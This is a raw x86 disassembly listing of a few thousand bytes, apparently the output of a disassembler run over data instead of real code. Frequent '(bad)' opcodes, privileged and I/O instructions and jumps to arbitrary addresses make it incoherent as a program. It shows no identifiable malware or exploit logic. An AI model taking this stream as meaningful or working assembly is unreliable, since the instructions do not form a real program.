  41b2b8:	dec    ebx
  41b2b9:	pop    edx
  41b2ba:	xchg   ecx,eax
  41b2bb:	cmp    al,0x2c
  41b2bd:	cs mov ecx,0xaad70cd3
  41b2c3:	leave  
  41b2c4:	mov    cl,0xda
  41b2c6:	les    esi,FWORD PTR [edx]
  41b2c8:	arpl   WORD PTR gs:[ecx-0x60],sp
  41b2cc:	dec    ebx
  41b2cd:	leave  
  41b2ce:	daa    
  41b2cf:	inc    edi
  41b2d0:	pop    ds
  41b2d1:	adc    edx,DWORD PTR [esi+edi*8+0x73197abf]
  41b2d8:	jb     0x41b2c7
  41b2da:	add    eax,0x122d2d6d
  41b2df:	retf   
  41b2e0:	xchg   edx,eax
  41b2e1:	cs sub eax,0x6492ff63
  41b2e7:	mov    DWORD PTR [edi+0x65],ecx
  41b2ea:	out    dx,al
  41b2eb:	fdivr  QWORD PTR [edx]
  41b2ed:	mov    ds:0x3673b555,eax
  41b2f2:	call   eax
  41b2f4:	sub    bh,ah
  41b2f6:	or     ebx,DWORD PTR [ebp+0x4ecbd1b3]
  41b2fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2fd:	es xchg ebp,eax
  41b2ff:	inc    edi
  41b300:	push   DWORD PTR [eax]
  41b302:	(bad)  
  41b303:	mov    ah,0x4f
  41b305:	xchg   BYTE PTR [edi],cl
  41b307:	test   al,0xd0
  41b309:	mov    dh,0x8a
  41b30b:	push   0x609b0427
  41b310:	repnz fisttp WORD PTR [eax+0x16]
  41b314:	pxor   mm7,QWORD PTR [eax]
  41b317:	test   esp,ecx
  41b319:	ss pop esp
  41b31b:	inc    DWORD PTR [ecx-0x2fb2fb44]
  41b321:	clc    
  41b322:	mov    esp,0xd934f13f
  41b327:	(bad)  [eax-0x15]
  41b32a:	add    ecx,DWORD PTR [ebx-0x5429b5f5]
  41b330:	dec    esi
  41b331:	add    al,0x5f
  41b333:	ja     0x41b3aa
  41b335:	push   eax
  41b336:	ret    
  41b337:	fdiv   st,st(0)
  41b339:	and    al,0x5a
  41b33b:	retf   
  41b33c:	mov    ebx,0xfc818f9c
  41b341:	inc    ecx
  41b342:	daa    
  41b343:	aas    
  41b344:	sar    BYTE PTR [eax],0xd
  41b347:	loope  0x41b377
  41b349:	(bad)  
  41b34a:	imul   eax,edx,0x6f
  41b34d:	lods   eax,DWORD PTR ds:[esi]
  41b34e:	push   eax
  41b34f:	sub    dl,BYTE PTR [esi-0x63]
  41b352:	out    dx,al
  41b353:	jb     0x41b361
  41b355:	mov    BYTE PTR [ebx],cl
  41b357:	sbb    BYTE PTR [edx-0x63],ch
  41b35a:	sub    BYTE PTR ds:0xc27d367c,al
  41b360:	das    
  41b361:	lea    edi,[esi]
  41b363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b364:	xchg   edx,eax
  41b365:	ss fwait
  41b367:	mov    al,0xa0
  41b369:	test   al,dh
  41b36b:	arpl   WORD PTR [ecx-0x3a47c987],sp
  41b371:	leave  
  41b372:	mov    al,ds:0xce1ecae6
  41b377:	push   esp
  41b378:	mov    WORD PTR [edi+edx*2-0x1f0edaba],es
  41b37f:	pop    esi
  41b380:	loope  0x41b33f
  41b382:	(bad)  
  41b384:	adc    cl,BYTE PTR [ecx-0x5fcb7ce2]
  41b38a:	mov    esi,0xa19e1db6
  41b38f:	or     ebp,DWORD PTR [ebx-0x756619]
  41b395:	mov    ds:0xa6258b8,eax
  41b39a:	push   0xffffffb2
  41b39c:	and    eax,0x9e8fa401
  41b3a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3a2:	or     al,BYTE PTR [eax+0x722f1b45]
  41b3a8:	lods   eax,DWORD PTR ds:[esi]
  41b3a9:	cmp    DWORD PTR [edx+edx*1-0x18],eax
  41b3ad:	stc    
  41b3ae:	push   ebp
  41b3af:	adc    bh,BYTE PTR [edx+esi*1]
  41b3b2:	xchg   edx,eax
  41b3b3:	test   al,0x59
  41b3b5:	stos   BYTE PTR es:[edi],al
  41b3b6:	pop    ds
  41b3b7:	mov    bh,0x69
  41b3b9:	loope  0x41b389
  41b3bb:	fild   WORD PTR [ebx+0x21]
  41b3be:	lds    esp,FWORD PTR [esi+0xe]
  41b3c1:	xor    BYTE PTR [ecx+eax*4],cl
  41b3c4:	mov    ds:0xd84a9c58,eax
  41b3c9:	je     0x41b39f
  41b3cb:	mov    al,ds:0x137383c2
  41b3d0:	jo     0x41b387
  41b3d2:	dec    edx
  41b3d3:	dec    edx
  41b3d4:	mov    WORD PTR [edx],?
  41b3d6:	mov    ecx,esi
  41b3d8:	xchg   DWORD PTR [edi],esi
  41b3da:	std    
  41b3db:	mov    ah,0x4c
  41b3dd:	mov    bl,0x81
  41b3df:	adc    eax,0xd4e2783e
  41b3e4:	popf   
  41b3e5:	push   0xffffffcb
  41b3e7:	fimul  WORD PTR [ecx+0x76]
  41b3ea:	cmp    BYTE PTR [ecx],ch
  41b3ec:	ret    
  41b3ed:	adc    edi,DWORD PTR [ebp+0x7e93b1b3]
  41b3f3:	lea    edx,[edx+0x3e1609c5]
  41b3f9:	cmp    eax,0xf12f7211
  41b3fe:	fwait
  41b3ff:	xor    bl,BYTE PTR [ebx]
  41b401:	and    BYTE PTR [eax+0x8],cl
  41b404:	das    
  41b405:	hlt    
  41b406:	pop    eax
  41b407:	test   al,0xe9
  41b409:	xor    eax,0xe38154e0
  41b40e:	ins    BYTE PTR es:[edi],dx
  41b40f:	sub    DWORD PTR [ebx-0x6b52102a],edi
  41b415:	jnp    0x41b45a
  41b417:	add    dl,ch
  41b419:	stos   BYTE PTR es:[edi],al
  41b41a:	jmp    0x8d9cc8b7
  41b41f:	das    
  41b420:	mov    dl,0x7a
  41b422:	add    edx,esi
  41b424:	xor    esi,esp
  41b426:	xor    edx,DWORD PTR [edi]
  41b428:	push   ss
  41b429:	clc    
  41b42a:	retf   
  41b42b:	and    eax,0x87e337af
  41b430:	shl    BYTE PTR [ebx+0x6233e88b],0xde
  41b437:	inc    esp
  41b438:	call   0x8509ef17
  41b43d:	in     al,0xfc
  41b43f:	scas   al,BYTE PTR es:[edi]
  41b440:	inc    ecx
  41b441:	jge    0x41b469
  41b443:	not    DWORD PTR [edx+ebp*1]
  41b446:	sbb    eax,0xb4fa6427
  41b44b:	sub    BYTE PTR [ecx],dh
  41b44d:	lods   al,BYTE PTR ds:[esi]
  41b44e:	jge    0x41b491
  41b450:	adc    eax,0x66efc5b5
  41b455:	aaa    
  41b456:	scas   eax,DWORD PTR es:[edi]
  41b457:	push   0xe9033d45
  41b45c:	lea    eax,ds:0xb5ebc580
  41b462:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b463:	sub    ecx,DWORD PTR [edx]
  41b465:	push   0xffffff95
  41b467:	xchg   ecx,eax
  41b468:	arpl   WORD PTR [edx+0xe],si
  41b46b:	lds    eax,FWORD PTR [edi-0x6a]
  41b46e:	and    eax,DWORD PTR [esi-0x498f1efa]
  41b474:	loopne 0x41b49d
  41b476:	push   ecx
  41b477:	push   edx
  41b478:	rol    cl,cl
  41b47a:	call   0x2d4a5735
  41b47f:	dec    ecx
  41b480:	jbe    0x41b4d7
  41b482:	sbb    esp,DWORD PTR [eax]
  41b484:	in     eax,dx
  41b485:	loop   0x41b4a0
  41b487:	ins    BYTE PTR es:[edi],dx
  41b488:	sbb    al,0x1d
  41b48a:	or     BYTE PTR [esi-0x6ebfff5b],bl
  41b490:	jg     0x41b420
  41b492:	mov    ?,WORD PTR [ebx]
  41b494:	cmp    DWORD PTR [ecx-0x30],0x394594c1
  41b49b:	inc    edi
  41b49c:	sahf   
  41b49d:	cld    
  41b49e:	pop    ss
  41b49f:	loop   0x41b444
  41b4a1:	push   edx
  41b4a2:	xchg   ebx,eax
  41b4a3:	or     BYTE PTR [esi+0x6],dh
  41b4a6:	addr16 cld 
  41b4a8:	jae    0x41b48a
  41b4aa:	push   edx
  41b4ab:	jo     0x41b4d5
  41b4ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4ae:	sub    dh,0x46
  41b4b1:	into   
  41b4b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4b3:	ins    BYTE PTR es:[edi],dx
  41b4b4:	aas    
  41b4b5:	mov    ah,0x44
  41b4b7:	push   ss
  41b4b8:	repz push 0xb00978c0
  41b4be:	in     al,0x8c
  41b4c0:	je     0x41b44f
  41b4c2:	push   edx
  41b4c3:	sub    bl,BYTE PTR [edx+0x6c]
  41b4c6:	sbb    al,bl
  41b4c8:	add    BYTE PTR [esi],dh
  41b4ca:	push   cs
  41b4cb:	or     DWORD PTR [esi],ecx
  41b4cd:	mov    edx,DWORD PTR [esi+0x18]
  41b4d0:	xchg   edi,eax
  41b4d1:	mov    eax,0xa79d1b44
  41b4d6:	jo     0x41b47f
  41b4d8:	jo     0x41b4c2
  41b4da:	xchg   edi,eax
  41b4db:	jb     0x41b558
  41b4dd:	daa    
  41b4de:	lods   eax,DWORD PTR ds:[esi]
  41b4df:	jecxz  0x41b519
  41b4e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4e2:	(bad)  
  41b4e3:	mov    fs,WORD PTR [ebx+ebp*4-0x2c]
  41b4e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4e8:	int3   
  41b4e9:	stos   BYTE PTR es:[edi],al
  41b4ea:	push   0xffffffe1
  41b4ec:	rep lods al,BYTE PTR ds:[esi]
  41b4ee:	pop    eax
  41b4ef:	mov    edx,0x805a8b7f
  41b4f4:	ror    BYTE PTR [edi],cl
  41b4f6:	pushf  
  41b4f7:	mov    es,WORD PTR ds:0x7b4e1292
  41b4fd:	stc    
  41b4fe:	sub    BYTE PTR [esi+0x7209b20c],ah
  41b504:	rcl    BYTE PTR [esi+ebx*2-0xb],1
  41b508:	xchg   ebx,eax
  41b509:	sub    ch,BYTE PTR [edi]
  41b50b:	inc    edi
  41b50c:	push   esp
  41b50d:	xor    BYTE PTR [esp+eiz*2-0x37],0x72
  41b512:	push   ss
  41b513:	push   ss
  41b514:	hlt    
  41b515:	(bad)  
  41b516:	rcl    DWORD PTR [ebx+0xd],1
  41b519:	dec    ecx
  41b51a:	into   
  41b51b:	inc    edi
  41b51c:	mov    edx,DWORD PTR [esi+esi*1]
  41b51f:	push   es
  41b520:	jle    0x41b53e
  41b522:	xchg   edx,eax
  41b523:	cmp    al,0x98
  41b525:	imul   ebp,DWORD PTR [eax+0x2d],0x6c
  41b529:	add    ebp,edi
  41b52b:	push   ecx
  41b52c:	loopne 0x41b4b0
  41b52e:	test   eax,0xabd25b3
  41b533:	adc    DWORD PTR [ecx+0x5e],ecx
  41b536:	out    0x77,al
  41b538:	mov    dh,0xcd
  41b53a:	adc    eax,0x24e774c
  41b53f:	sbb    ch,0xc2
  41b542:	jmp    0x41b506
  41b544:	mov    bh,0x30
  41b546:	adc    eax,0x63be6c66
  41b54b:	in     eax,0xc5
  41b54d:	faddp  st(2),st
  41b54f:	xchg   ebp,eax
  41b550:	pusha  
  41b551:	in     al,dx
  41b552:	fs jle 0x41b578
  41b555:	add    eax,0x6348e088
  41b55a:	push   ebx
  41b55b:	pushf  
  41b55c:	mov    esi,0x4bce6bfb
  41b561:	inc    ecx
  41b562:	pop    ds
  41b563:	sbb    BYTE PTR [ecx+0x3b5642ba],dh
  41b569:	jae    0x41b5a3
  41b56b:	ror    cl,1
  41b56d:	xor    esp,DWORD PTR [ecx-0x5a37be8c]
  41b573:	je     0x41b512
  41b575:	sub    BYTE PTR [eax+0x1cd2d46d],0xd9
  41b57c:	punpckldq mm6,mm5
  41b57f:	add    DWORD PTR [esi-0x39181ba],eax
  41b585:	fnstcw WORD PTR [eax-0x70]
  41b588:	test   edx,ebp
  41b58a:	gs jnp 0x41b60c
  41b58d:	imul   esp,DWORD PTR [edx+0x49],0x61
  41b591:	mov    WORD PTR [esi-0x4f57204c],gs
  41b597:	adc    BYTE PTR [ecx+0x24],cl
  41b59a:	and    eax,0x5ed18501
  41b59f:	fcom   QWORD PTR ds:0x7b59dd8d
  41b5a5:	(bad)  
  41b5a7:	and    al,0xec
  41b5a9:	or     bh,BYTE PTR [edi]
  41b5ab:	mov    ch,0x52
  41b5ad:	pop    ebp
  41b5ae:	pop    ds
  41b5af:	fisub  WORD PTR [edi-0x42b355bf]
  41b5b5:	mov    bh,0xe1
  41b5b7:	cwde   
  41b5b8:	and    ebx,esi
  41b5ba:	xor    eax,0xde8b81ce
  41b5bf:	sub    BYTE PTR ds:0x762061b8,cl
  41b5c5:	pushf  
  41b5c6:	std    
  41b5c7:	push   edx
  41b5c8:	xor    eax,0x3e7a4bc1
  41b5cd:	jl     0x41b62a
  41b5cf:	add    ecx,esp
  41b5d1:	adc    al,0x5a
  41b5d3:	inc    edi
  41b5d4:	adc    BYTE PTR [esp+ecx*4+0x54],0x52
  41b5d9:	pop    es
  41b5da:	(bad)  
  41b5dc:	xlat   BYTE PTR ds:[ebx]
  41b5dd:	int    0x21
  41b5df:	mov    ch,0x7c
  41b5e1:	push   0x75
  41b5e3:	mov    al,ds:0xc7a7e121
  41b5e8:	cmp    eax,0x4fc6c1d5
  41b5ed:	jo     0x41b5b6
  41b5ef:	adc    eax,0x49921198
  41b5f4:	push   DWORD PTR [esi-0x57005bc9]
  41b5fa:	iret   
  41b5fb:	test   DWORD PTR [ebp+0xf830b1],0x60b7cdba
  41b605:	aaa    
  41b606:	jo     0x41b661
  41b608:	mov    edx,0xfd00ac91
  41b60d:	std    
  41b60e:	xor    eax,0x70ed97d1
  41b613:	pusha  
  41b614:	xchg   esi,eax
  41b615:	imul   DWORD PTR [ebp-0x10]
  41b618:	add    DWORD PTR [ebx-0x54],0x4fb8b8bd
  41b61f:	sub    DWORD PTR [edi+0xfbc262e],eax
  41b625:	jns    0x41b5d2
  41b627:	dec    ebp
  41b628:	mov    bl,0x63
  41b62a:	inc    eax
  41b62b:	and    ch,BYTE PTR [esi]
  41b62d:	and    DWORD PTR [edi+0x24f0fa8b],0xd7ba263
  41b637:	out    0x7b,eax
  41b639:	(bad)  [eax-0x351658d]
  41b63f:	lock cdq 
  41b641:	out    0xe,al
  41b643:	xor    al,0xcb
  41b645:	and    DWORD PTR [ebx+0x63],ebp
  41b648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b649:	mov    edi,0xf39397f4
  41b64e:	dec    ebp
  41b64f:	xor    dh,dh
  41b651:	cld    
  41b652:	mov    WORD PTR ds:0x93e416fe,gs
  41b658:	cld    
  41b659:	adc    al,0x3b
  41b65b:	aaa    
  41b65c:	mov    edx,0xeda66c67
  41b661:	frstor [ecx+0x1c]
  41b664:	jecxz  0x41b62c
  41b666:	pop    ebp
  41b667:	(bad)  
  41b668:	pop    ss
  41b669:	mov    ebp,0x7c0a0b67
  41b66e:	test   eax,0x6e2fa41f
  41b673:	and    BYTE PTR [ebp+0x2e],0x42
  41b677:	inc    eax
  41b678:	pop    esi
  41b679:	fstp   DWORD PTR [edx-0x5f]
  41b67c:	sti    
  41b67d:	and    dl,ch
  41b67f:	push   edi
  41b680:	mov    BYTE PTR ds:0xb25be56e,cl
  41b686:	daa    
  41b687:	scas   eax,DWORD PTR es:[edi]
  41b688:	retf   
  41b689:	shl    DWORD PTR [ebp+esi*4+0x2bf2e835],cl
  41b690:	leave  
  41b691:	leave  
  41b692:	mov    al,ds:0xa54f5da0
  41b697:	icebp  
  41b698:	popf   
  41b699:	js     0x41b705
  41b69b:	ret    
  41b69c:	mov    ah,BYTE PTR [ecx+0x2eefea1e]
  41b6a2:	xchg   esi,eax
  41b6a3:	inc    esp
  41b6a4:	sbb    bl,BYTE PTR ds:0xe632f998
  41b6aa:	mov    edx,0x89fb52ae
  41b6af:	int3   
  41b6b0:	add    al,0x9d
  41b6b2:	retf   
  41b6b3:	jo     0x41b646
  41b6b5:	cmp    eax,0x70b38025
  41b6ba:	jno    0x41b66e
  41b6bc:	imul   esi,ecx,0xabfccda7
  41b6c2:	xchg   DWORD PTR [edi+0x3571eaac],esi
  41b6c8:	int3   
  41b6c9:	add    bl,bh
  41b6cb:	pop    ds
  41b6cc:	push   ss
  41b6cd:	xchg   BYTE PTR [ebx-0x286d96f3],cl
  41b6d3:	add    BYTE PTR [ebx+edx*4-0x166c23e7],bl
  41b6da:	(bad)  
  41b6db:	push   esi
  41b6dc:	repz sub DWORD PTR ds:0x726faebf,esi
  41b6e3:	push   eax
  41b6e4:	add    DWORD PTR [ebx-0x41c7fbcf],edi
  41b6ea:	test   ch,ah
  41b6ec:	sbb    al,0x7
  41b6ee:	jne    0x41b6b6
  41b6f0:	(bad)  
  41b6f1:	out    0x5c,al
  41b6f3:	push   eax
  41b6f4:	call   0x7c54:0x61dd3101
  41b6fb:	rcr    BYTE PTR [ecx],1
  41b6fd:	loope  0x41b6ff
  41b6ff:	xchg   esi,eax
  41b700:	hlt    
  41b701:	fsubrp st(0),st
  41b703:	sub    ebx,DWORD PTR [ebx+0x6e]
  41b706:	ret    
  41b707:	neg    BYTE PTR [ecx-0x4a7341f]
  41b70d:	mov    al,0x98
  41b70f:	push   cs
  41b710:	in     al,0x63
  41b712:	xchg   ecx,eax
  41b713:	loope  0x41b744
  41b715:	rcl    BYTE PTR [ecx],cl
  41b717:	imul   BYTE PTR [ebp-0x16]
  41b71a:	lahf   
  41b71b:	aam    0xf4
  41b71d:	into   
  41b71e:	adc    bh,BYTE PTR [edi]
  41b720:	inc    edx
  41b721:	pop    edx
  41b722:	inc    ebp
  41b723:	adc    eax,0xdc4bc8d4
  41b728:	adc    edi,DWORD PTR [esi]
  41b72a:	inc    edi
  41b72b:	(bad)  
  41b72c:	pop    edx
  41b72d:	dec    ebp
  41b72e:	inc    esi
  41b72f:	jle    0x41b717
  41b731:	add    eax,DWORD PTR [edx-0x611a2982]
  41b737:	int    0xf5
  41b739:	cmp    eax,DWORD PTR [esi]
  41b73b:	ret    
  41b73c:	pop    ds
  41b73d:	dec    ebx
  41b73e:	clc    
  41b73f:	mov    ebx,0x37999a34
  41b744:	sbb    edx,esi
  41b746:	jmp    0x41b6df
  41b748:	inc    edx
  41b749:	push   esi
  41b74a:	xor    eax,0x248a549
  41b74f:	push   ds
  41b750:	ror    BYTE PTR [ebp+0xa],0xe7
  41b754:	cmp    DWORD PTR [edx+edi*8-0x80],eax
  41b758:	aaa    
  41b759:	ucomiss xmm6,DWORD PTR [eax-0x46]
  41b75d:	or     al,0xf0
  41b75f:	inc    ecx
  41b760:	into   
  41b761:	dec    edx
  41b762:	aas    
  41b763:	aaa    
  41b764:	cmp    al,0xf
  41b766:	mov    ?,WORD PTR [edi-0x274c989f]
  41b76c:	mov    edx,0xc09477a1
  41b771:	ror    ch,1
  41b773:	push   ebx
  41b774:	popa   
  41b775:	shl    BYTE PTR [eax-0x3f],1
  41b778:	mov    edi,DWORD PTR [esi+0x6caac568]
  41b77e:	adc    BYTE PTR [esi+0x5f37669e],dh
  41b784:	inc    ebx
  41b785:	(bad)  
  41b786:	daa    
  41b787:	(bad)  
  41b788:	xchg   esi,eax
  41b789:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b78a:	mov    WORD PTR [esi-0x6546fcac],cs
  41b790:	ins    WORD PTR es:[edi],dx
  41b792:	push   ebp
  41b793:	add    al,0x3c
  41b795:	ror    BYTE PTR [eax-0x3d1c9f5c],1
  41b79b:	xchg   ebp,eax
  41b79c:	cmp    eax,DWORD PTR ds:0xf855c542
  41b7a2:	repnz div BYTE PTR [edi+0x6d]
  41b7a6:	in     eax,0x8e
  41b7a8:	push   es
  41b7a9:	clc    
  41b7aa:	mov    ds:0xf3598ba8,eax
  41b7af:	mov    ah,0xb3
  41b7b1:	test   al,0x62
  41b7b3:	or     BYTE PTR [ebx],cl
  41b7b5:	pop    esi
  41b7b6:	sbb    ebx,ebp
  41b7b8:	repz int 0x65
  41b7bb:	dec    ebp
  41b7bc:	xlat   BYTE PTR fs:[ebx]
  41b7be:	icebp  
  41b7bf:	xlat   BYTE PTR ds:[ebx]
  41b7c0:	push   esi
  41b7c1:	pavgw  mm3,QWORD PTR [bx-0x7fa0]
  41b7c7:	aas    
  41b7c8:	push   esp
  41b7c9:	pop    edi
  41b7ca:	adc    DWORD PTR [ebx+ecx*4],edi
  41b7cd:	xor    al,0x9a
  41b7cf:	shl    DWORD PTR [ecx+0x255f0fea],cl
  41b7d5:	inc    BYTE PTR ds:0x39d266e7
  41b7db:	loope  0x41b75e
  41b7dd:	lods   al,BYTE PTR ds:[esi]
  41b7de:	xchg   DWORD PTR [edx+0x78],edi
  41b7e1:	loope  0x41b797
  41b7e3:	cmp    eax,0x5458a208
  41b7e8:	cmp    BYTE PTR [eax+0x566e670c],dh
  41b7ee:	push   esp
  41b7ef:	loope  0x41b83a
  41b7f1:	sbb    bh,BYTE PTR [ebp-0x1]
  41b7f4:	je     0x41b789
  41b7f6:	clc    
  41b7f7:	aaa    
  41b7f8:	ins    DWORD PTR es:[edi],dx
  41b7f9:	aas    
  41b7fa:	or     BYTE PTR [edx-0x3a],ah
  41b7fd:	jl     0x41b7ba
  41b7ff:	(bad)  
  41b800:	jl     0x41b82e
  41b802:	gs inc ecx
  41b804:	test   BYTE PTR [eax-0x7b],bl
  41b807:	loop   0x41b7d2
  41b809:	add    al,0x88
  41b80b:	xlat   BYTE PTR ds:[ebx]
  41b80c:	cmp    BYTE PTR [ebx-0x7c3013a8],0xeb
  41b813:	ret    0xee98
  41b816:	dec    ebx
  41b817:	sub    DWORD PTR [ecx],ecx
  41b819:	rol    BYTE PTR [edi-0x37],1
  41b81c:	retf   
  41b81d:	repnz push ebp
  41b81f:	test   esi,esi
  41b821:	imul   edi,edi,0x12
  41b824:	imul   esi,DWORD PTR [edi-0x72],0x41c1c932
  41b82b:	mov    dl,cl
  41b82d:	clc    
  41b82e:	pop    esp
  41b82f:	mov    ds:0x5ac0f632,eax
  41b834:	or     BYTE PTR [ecx+0x1b],0xf8
  41b838:	sub    eax,DWORD PTR [ebx+0x11b28ecf]
  41b83e:	mov    ebp,DWORD PTR [ebx+0x709a9f54]
  41b844:	das    
  41b845:	add    ecx,DWORD PTR [ebx]
  41b847:	enter  0x8e36,0x99
  41b84b:	mov    esp,0x8bec8ee
  41b850:	xor    dh,dl
  41b852:	push   edx
  41b853:	and    DWORD PTR [edx+0x44],ebx
  41b856:	lock or al,0x9f
  41b859:	sbb    cl,al
  41b85b:	push   eax
  41b85c:	sbb    DWORD PTR [eax-0x42],esi
  41b85f:	and    eax,0xa2425e76
  41b864:	aam    0xfd
  41b866:	into   
  41b867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b868:	(bad)  
  41b869:	loop   0x41b854
  41b86b:	and    eax,0xdd46273d
  41b870:	(bad)  
  41b871:	sub    BYTE PTR [eax+0x4f7d0bd1],ch
  41b877:	js     0x41b879
  41b879:	or     DWORD PTR [ebx+edi*1-0xa],edx
  41b87d:	push   esi
  41b87e:	outs   dx,DWORD PTR ds:[esi]
  41b87f:	and    edi,DWORD PTR [ebx-0x5d]
  41b882:	cmp    cl,ch
  41b884:	push   edi
  41b885:	sbb    ch,BYTE PTR [esi]
  41b887:	scas   al,BYTE PTR es:[edi]
  41b888:	into   
  41b889:	fsub   QWORD PTR [edx+0x3a5e0d56]
  41b88f:	ins    DWORD PTR es:[edi],dx
  41b890:	jae    0x41b863
  41b892:	sub    eax,ebx
  41b894:	(bad)  
  41b895:	mov    cl,0x5d
  41b897:	in     al,dx
  41b898:	mov    dh,0xda
  41b89a:	ror    ebp,1
  41b89c:	xor    eax,0xcb628437
  41b8a1:	pop    ebx
  41b8a2:	pop    ebx
  41b8a3:	scas   al,BYTE PTR es:[edi]
  41b8a4:	adc    BYTE PTR [ebp+0x6e],bl
  41b8a7:	fcom   QWORD PTR [ecx+0x7c]
  41b8aa:	shl    DWORD PTR [esi+0x388b419e],cl
  41b8b0:	jmp    0x41b900
  41b8b2:	mov    al,ds:0x10fb128a
  41b8b7:	dec    eax
  41b8b8:	pop    esp
  41b8b9:	mov    ds:0xb1c46158,eax
  41b8be:	hlt    
  41b8bf:	xor    eax,0xd080c663
  41b8c4:	xchg   ecx,eax
  41b8c5:	push   edx
  41b8c6:	ret    
  41b8c7:	ja     0x41b876
  41b8c9:	sbb    dl,bh
  41b8cb:	pop    esi
  41b8cc:	fsub   QWORD PTR [ebx]
  41b8ce:	adc    cl,BYTE PTR [ebx+eiz*1+0x5b]
  41b8d2:	jmp    0x41b884
  41b8d4:	daa    
  41b8d5:	lock adc al,0xa4
  41b8d8:	pop    ecx
  41b8d9:	push   0xe76b426d
  41b8de:	out    dx,eax
  41b8df:	(bad)  
  41b8e0:	sbb    al,0xc8
  41b8e2:	outs   dx,DWORD PTR ds:[esi]
  41b8e3:	xor    eax,0x377d6a4a
  41b8e8:	test   dl,ah
  41b8ea:	shl    edi,1
  41b8ec:	fstp   st(0)
  41b8ee:	imul   esi,DWORD PTR [edi],0x7c009b59
  41b8f4:	pop    edx
  41b8f5:	xchg   edx,eax
  41b8f6:	or     al,0x52
  41b8f8:	lods   al,BYTE PTR ds:[esi]
  41b8f9:	xor    dh,BYTE PTR [edx-0x7609194f]
  41b8ff:	into   
  41b900:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b901:	sbb    ebp,DWORD PTR [esi]
  41b903:	scas   al,BYTE PTR es:[edi]
  41b904:	mov    WORD PTR [edi-0x42639ecb],es
  41b90a:	pop    ebp
  41b90b:	adc    esi,DWORD PTR [edx]
  41b90d:	sti    
  41b90e:	enter  0xcef8,0xf0
  41b912:	arpl   WORD PTR [eax+0x49],si
  41b915:	das    
  41b916:	push   esp
  41b917:	aad    0xdd
  41b919:	loop   0x41b8b6
  41b91b:	sub    eax,0x768a4459
  41b920:	xlat   BYTE PTR ds:[ebx]
  41b921:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b922:	pop    edx
  41b923:	shr    DWORD PTR [edx-0x1d18b991],cl
  41b929:	adc    BYTE PTR [edi-0x32a93bf8],bl
  41b92f:	mov    ds,WORD PTR [ecx]
  41b931:	imul   edi,DWORD PTR [ecx+edi*4],0x411be5f9
  41b938:	sbb    DWORD PTR [ecx+0x5e],ebp
  41b93b:	push   ss
  41b93c:	daa    
  41b93d:	mov    eax,DWORD PTR [edx]
  41b93f:	sti    
  41b940:	shr    BYTE PTR [ebx-0x4e],cl
  41b943:	add    eax,DWORD PTR [edx+0x5306de95]
  41b949:	jne    0x41b97f
  41b94b:	inc    esp
  41b94c:	jp     0x41b92a
  41b94e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b94f:	mov    ds:0x199ed0d9,eax
  41b954:	test   BYTE PTR [ecx+0x3a],ch
  41b957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b958:	and    eax,0xff861705
  41b95d:	mov    ebp,0xea808b43
  41b962:	xchg   edi,eax
  41b963:	sub    eax,0x605ac757
  41b968:	xchg   ebx,eax
  41b969:	push   ss
  41b96a:	or     DWORD PTR [esi+0x76254749],esi
  41b970:	stos   BYTE PTR es:[edi],al
  41b971:	mov    cl,BYTE PTR [ecx]
  41b973:	pop    ss
  41b974:	fstp   DWORD PTR [eax]
  41b976:	aam    0x9d
  41b978:	mov    WORD PTR [ebp+0x3e],ax
  41b97c:	xor    edi,ebx
  41b97e:	pop    ecx
  41b97f:	pop    esi
  41b980:	pop    ss
  41b981:	cmc    
  41b982:	js     0x41b92f
  41b984:	inc    esi
  41b985:	xor    edi,edi
  41b987:	jne    0x41b9d3
  41b989:	mov    ch,0xab
  41b98b:	ins    DWORD PTR es:[edi],dx
  41b98c:	sbb    ah,BYTE PTR [edx+ebp*4-0x3902148b]
  41b993:	pop    ds
  41b994:	and    BYTE PTR [ebp+0x36],0x5e
  41b998:	lea    eax,[eax+0x7f9e9b7c]
  41b99e:	and    al,0x16
  41b9a0:	add    al,0xab
  41b9a2:	mov    eax,cs
  41b9a4:	cmc    
  41b9a5:	push   esp
  41b9a6:	jge    0x41b9f3
  41b9a8:	mov    bh,0x9e
  41b9aa:	loop   0x41b9e3
  41b9ac:	jo     0x41b965
  41b9ae:	inc    esi
  41b9af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9b0:	sub    al,0xb2
  41b9b2:	mov    ah,0x87
  41b9b4:	xchg   ecx,eax
  41b9b5:	aas    
  41b9b6:	lahf   
  41b9b7:	(bad)  
  41b9b8:	push   esi
  41b9b9:	sub    ecx,DWORD PTR [ecx+0xc]
  41b9bc:	call   0xabe304aa
  41b9c1:	mov    al,ds:0xfd6b1c88
  41b9c6:	clc    
  41b9c7:	and    DWORD PTR [esi+0x4f518387],eax
  41b9cd:	cmp    eax,0xffffff9f
  41b9d0:	dec    ebx
  41b9d1:	bnd jp 0x41b9d7
  41b9d4:	out    dx,al
  41b9d5:	sahf   
  41b9d6:	push   ss
  41b9d7:	push   ebp
  41b9d8:	int    0xf5
  41b9da:	adc    ah,0x3
  41b9dd:	xor    al,0x16
  41b9df:	xor    ebx,DWORD PTR [eax-0x74]
  41b9e2:	mov    bh,0x8
  41b9e4:	dec    edx
  41b9e5:	push   edx
  41b9e6:	js     0x41b9d1
  41b9e8:	inc    esp
  41b9e9:	ret    
  41b9ea:	pusha  
  41b9eb:	push   esp
  41b9ec:	lahf   
  41b9ed:	cs call 0xec4fb4b5
  41b9f3:	push   esi
  41b9f4:	lods   al,BYTE PTR ds:[esi]
  41b9f5:	imul   eax,DWORD PTR [ebp+ebp*4+0x4e0d2fef],0x2810fd7d
  41ba00:	loopne 0x41ba2d
